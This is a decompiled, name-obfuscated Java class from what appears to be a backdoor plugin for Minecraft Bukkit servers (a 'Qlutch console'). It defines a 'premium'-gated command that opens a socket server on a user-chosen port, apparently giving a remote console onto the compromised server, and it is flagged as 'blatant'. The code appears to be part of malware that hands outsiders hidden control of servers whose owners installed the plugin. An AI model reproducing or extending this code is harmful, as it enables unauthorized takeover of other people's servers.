/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl.premium;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.sockets.SocketServer;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class ConsoleconnectCommand
extends Command {
    public ConsoleconnectCommand() {
        ConsoleconnectCommand lllllllllllllllllIIIlIllIIIlIIIl;
    }

    @Override
    public void execute(Core lllllllllllllllllIIIlIllIIIIIlll, String lllllllllllllllllIIIlIllIIIIlIlI, String[] lllllllllllllllllIIIlIllIIIIIllI, Player lllllllllllllllllIIIlIllIIIIlIII) {
        if (lllllllllllllllllIIIlIllIIIIIlll.premium.contains(lllllllllllllllllIIIlIllIIIIlIII.getName())) {
            if (lllllllllllllllllIIIlIllIIIIIllI.length <= 1) {
                lllllllllllllllllIIIlIllIIIIlIII.sendMessage(Settings.USAGE("connectconsole <port>"));
            } else if (DataManager.getData().getString("port").equals(lllllllllllllllllIIIlIllIIIIIllI[1])) {
                lllllllllllllllllIIIlIllIIIIlIII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The port is already ").append(lllllllllllllllllIIIlIllIIIIIllI[1]))));
                lllllllllllllllllIIIlIllIIIIlIII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Connect to the server with the port: ").append(Settings.RED).append(lllllllllllllllllIIIlIllIIIIIllI[1]))));
            } else {
                DataManager.getData().set("port", (Object)lllllllllllllllllIIIlIllIIIIIllI[1]);
                DataManager.getData().set("connect", (Object)true);
                DataManager.saveData();
                lllllllllllllllllIIIlIllIIIIlIII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You can connect to the Qlutch console by entering the server ip then the port in the format ip:").append(lllllllllllllllllIIIlIllIIIIIllI[1]))));
                if (Core.consoleServer != null) {
                    Core.consoleServer.stop();
                }
                Bukkit.getScheduler().runTaskLater((Plugin)lllllllllllllllllIIIlIllIIIIIlll, () -> {
                    int lllllllllllllllllIIIlIllIIIIIIII = Integer.parseInt(lllllllllllllllllIIIlIllIIIIIllI[1]);
                    Core.consoleServer = new SocketServer(lllllllllllllllllIIIlIllIIIIIIII);
                }, 1L);
            }
        } else {
            lllllllllllllllllIIIlIllIIIIlIII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

